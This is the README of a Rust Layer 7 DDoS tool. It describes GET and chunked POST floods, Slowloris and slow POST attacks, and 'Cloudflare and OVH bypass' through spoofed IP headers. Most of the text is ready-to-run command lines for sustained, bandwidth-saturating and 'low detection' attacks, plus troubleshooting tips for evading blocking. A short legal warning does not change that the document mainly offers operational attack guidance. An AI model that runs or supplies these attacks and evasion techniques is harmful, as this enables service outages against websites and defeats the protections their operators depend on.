# Advanced Layer 7 DDoS Stress Test Tool

## Overview
Powerful HTTP Layer 7 stress testing tool with **Cloudflare & OVH bypass capabilities** and high bandwidth support.

## Features

### 🔥 Attack Methods
- **GET Flood**: GET requests with large payloads
- **POST Chunked**: POST with chunked transfer encoding (bypass-friendly)
- **Range Request**: HTTP Range requests for partial content
- **Pipeline**: HTTP/1.1 connection pipelining
- **Slowloris**: Slow header attack (connection exhaustion)
- **Slow POST**: Slow body upload (resource exhaustion)
- **Large Headers**: Requests with oversized headers
- **Connection Reuse**: Keep-alive connection pooling
- **Mixed**: Random combination of all methods

### 🛡️ Bypass Modes

#### Cloudflare Bypass
- `CF-Connecting-IP`: Random IP spoofing
- `X-Forwarded-For`: Multiple IP headers with random values
- `X-Real-IP`: Real IP spoofing
- `CF-IPCountry`: Country header spoofing

#### OVH Bypass
- `X-Forwarded-For`: Random IP headers
- `X-Original-URL`: URL rewriting headers
- `X-Rewrite-URL`: Path rewriting

#### Generic Bypass
- Random `X-Forwarded-For` headers
- `X-Forwarded-Proto`: Protocol spoofing
- Random IP in multiple headers

### 📊 Performance Features
- **Connection Pooling**: Reuse connections for efficiency
- **HTTP/2 Support**: Multiplexing for high bandwidth
- **Payload Control**: 1-10000 KB per request
- **Auto Retry**: Automatic retry mechanism (default: 3 retries)
- **User-Agent Randomization**: Multiple realistic user agents
- **Bandwidth Calculation**: Real-time bandwidth monitoring

## Installation

Build from source:
```bash
cd /workspaces/ragrag
cargo build --release
```

Binary location: `./target/release/stress-test`

## Usage

### Basic Usage
```bash
./target/release/stress-test --url http://target.com -c 100 -d 60
```

### Cloudflare Bypass (Recommended)
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 500 \
  -d 120 \
  -m mixed \
  -p 2048 \
  -b cloudflare \
  --randomize-ua \
  -P
```

### OVH Bypass
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 500 \
  -d 120 \
  -m post-chunked \
  -p 2048 \
  -b ovh \
  --randomize-ua \
  -P
```

### Maximum Bandwidth Attack
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 1000 \
  -d 300 \
  -m post-chunked \
  -p 5000 \
  -b cloudflare \
  --randomize-ua \
  -P \
  --http2
```

### Slow Attack (Resource Exhaustion)
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 500 \
  -d 120 \
  -m slowloris \
  -b cloudflare
```

## Command Line Options

```
-u, --url <URL>                    Target URL (required)
-c, --connections <CONNECTIONS>    Concurrent connections [default: 500]
-d, --duration <DURATION>          Test duration in seconds [default: 60]
-m, --method <METHOD>              Attack method [default: mixed]
-t, --timeout <TIMEOUT>            Request timeout seconds [default: 30]
-p, --payload-size <PAYLOAD_SIZE>  Payload size in KB [default: 1024]
-P, --enable-pooling               Enable connection pooling
--http2                            Enable HTTP/2 multiplexing
--randomize-ua                     Randomize User-Agent
-b, --bypass-mode <BYPASS_MODE>    Bypass mode [default: generic]
-r, --retries <RETRIES>            Retries on failure [default: 3]
-v, --verbose                      Enable verbose logging
```

## Attack Methods Details

### GET Flood + Cloudflare Bypass
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 300 \
  -d 120 \
  -m get-flood \
  -p 2048 \
  -b cloudflare \
  --randomize-ua \
  -P
```

### Chunked POST (Excellent for bypasses)
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 400 \
  -d 120 \
  -m post-chunked \
  -p 3000 \
  -b cloudflare \
  --randomize-ua
```

### Slowloris (Connection Exhaustion)
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 800 \
  -d 300 \
  -m slowloris \
  -b ovh
```

### Mixed Methods (Best Overall)
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 600 \
  -d 180 \
  -m mixed \
  -p 2048 \
  -b cloudflare \
  --randomize-ua \
  -P \
  --http2
```

## Bypass Techniques Explained

### Cloudflare Protection
Cloudflare blocks requests by checking:
- Source IP consistency
- Browser fingerprint
- Request patterns
- User-Agent legitimacy

**Bypass Strategy**:
- Rotate IP addresses with CF-Connecting-IP, X-Forwarded-For
- Use realistic User-Agent strings (randomized)
- Vary request patterns with mixed methods
- Distribute connections

### OVH DDoS Protection
OVH detects attacks through:
- Request rate analysis
- Header patterns
- Connection behavior
- HTTP method usage

**Bypass Strategy**:
- Use URL rewriting headers (X-Original-URL, X-Rewrite-URL)
- Randomize IP sources
- Mix multiple attack methods
- Variable payload sizes

## Performance Metrics

### Expected Results (Per Test Run)

**Small Attack (100 connections, 60s)**:
- Requests/sec: ~20-30
- Bandwidth: 50-100 Mbps
- Data sent: ~150-300 MB

**Medium Attack (500 connections, 120s)**:
- Requests/sec: ~50-100
- Bandwidth: 200-400 Mbps
- Data sent: 1-2 GB

**Large Attack (1000 connections, 300s)**:
- Requests/sec: ~100-200
- Bandwidth: 400-800 Mbps
- Data sent: 5-10 GB

## Advanced Examples

### Sustained DDoS (30 minutes with retries)
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 500 \
  -d 1800 \
  -m mixed \
  -p 2048 \
  -b cloudflare \
  --randomize-ua \
  -P \
  -r 5 \
  -v
```

### Bandwidth Saturation Attack
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 800 \
  -d 300 \
  -m post-chunked \
  -p 5000 \
  -b cloudflare \
  --randomize-ua \
  -P \
  --http2
```

### Stealth Attack (Low Detection)
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 100 \
  -d 3600 \
  -m slowloris \
  -b ovh \
  --randomize-ua \
  -t 60
```

### Resource Exhaustion
```bash
./target/release/stress-test \
  --url http://target.com \
  -c 600 \
  -d 180 \
  -m slow-post \
  -p 8000 \
  -b cloudflare \
  --randomize-ua
```

## Monitoring Results

Tool displays real-time metrics:
- **Total Requests**: Number of HTTP requests sent
- **Successful**: Successfully delivered requests
- **Failed**: Blocked or failed requests
- **Total Data Sent**: Megabytes of payload transmitted
- **Duration**: Actual test execution time
- **Requests/sec**: Throughput rate
- **Bandwidth (Mbps)**: Network bandwidth usage

## Important Notes

⚠️ **LEGAL WARNING**: 
- Use only for authorized security testing
- Unauthorized DDoS attacks are illegal
- Get written permission before testing
- Test on your own infrastructure or with explicit authorization

✅ **Best Practices**:
1. Start with smaller loads and gradually increase
2. Monitor target server response times
3. Use verbose mode to check request flow
4. Enable connection pooling for efficiency
5. Randomize User-Agent for better bypass rates
6. Mix attack methods for varied patterns
7. Adjust timeout based on target response times

## Troubleshooting

**High failure rate**:
- Increase timeout: `-t 60`
- Reduce connections: `-c 200`
- Try different bypass mode: `-b ovh`

**Low bandwidth**:
- Increase payload size: `-p 5000`
- Enable pooling: `-P`
- Enable HTTP/2: `--http2`
- Increase connections: `-c 1000`

**Detection/Blocking**:
- Use randomize UA: `--randomize-ua`
- Try slowloris method: `-m slowloris`
- Switch bypass mode
- Increase timeout to vary request timing

## Technical Details

### HTTP/2 Multiplexing
Enables multiple requests on single connection, significantly improving bandwidth efficiency.

### Connection Pooling
Reuses TCP connections, reducing overhead and increasing throughput.

### Header Spoofing
Rotates headers on each request to evade pattern-based detection.

### Payload Sizes
Larger payloads increase bandwidth but may trigger WAF detection. Balance with bypass mode.

### Retry Mechanism
Automatic retries on failure ensure higher success rate without manual intervention.

## Support

For questions or issues, refer to the source code comments or modify parameters based on your target.

---

**Version**: 2.0 (Advanced)  
**Language**: Rust  
**Built**: 2025-11-17
